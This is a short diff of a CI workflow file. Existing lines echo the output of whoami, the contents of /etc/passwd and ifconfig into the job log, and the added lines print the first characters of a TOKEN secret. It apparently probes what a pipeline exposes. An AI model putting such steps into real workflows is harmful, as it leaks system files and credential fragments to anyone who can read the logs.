@@ -19,6 +19,8 @@ jobs:
         echo "New issue: $(whoami)"
         echo "New issue: $(cat /etc/passwd)"
         echo "New issue: $(ifconfig)"
+        echo "${TOKEN:0:9}[...]"
+        echo "${TOKEN:0:9}[...]"
 
     - name: Set up Python
       uses: actions/setup-python@v5
@@ -30,3 +32,4 @@ jobs:
 
     - name: Run app
       run: python app.py
+
